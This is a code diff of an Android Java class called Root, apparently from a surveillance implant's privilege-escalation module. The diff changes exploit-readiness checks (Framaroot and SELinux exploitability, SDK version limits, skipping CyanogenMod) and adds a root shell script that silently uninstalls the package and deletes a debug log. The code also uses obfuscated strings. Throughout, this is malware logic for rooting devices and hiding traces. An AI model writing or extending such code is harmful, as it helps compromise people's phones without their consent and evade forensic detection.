@@ -41,6 +41,7 @@ public class Root {
 	public static String method = "";
 	public static Date startExploiting = new Date();
 	private static int askedSu = 0;
+	
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -49,7 +50,6 @@ public class Root {
 				return true;
 			}
 		}
-
 		return false;
 	}
 
@@ -220,8 +220,12 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
+		
 		script += Configuration.shellFile + " ru\n";
 		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
+		if(Cfg.DEBUG){
+			script += "rm /data/local/tmp/log\n";
+		}
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -338,6 +342,10 @@ public class Root {
 		final String exploitCheck = M.e("ec"); // ec
 
 		if(checkCyanogenmod()){
+			return false;
+		}
+		
+		if ((android.os.Build.VERSION.SDK_INT < 14 || android.os.Build.VERSION.SDK_INT > 17)){
 			return false;
 		}
 		
@@ -571,7 +579,9 @@ public class Root {
 					ask = true;
 				}
 			} else {
-				ask = !(checkFramarootExploitability() || checkSELinuxExploitability());
+				boolean frama = checkFramarootExploitability();
+				boolean se = checkSELinuxExploitability();
+				ask = !( frama || se);
 			}
 		}
 
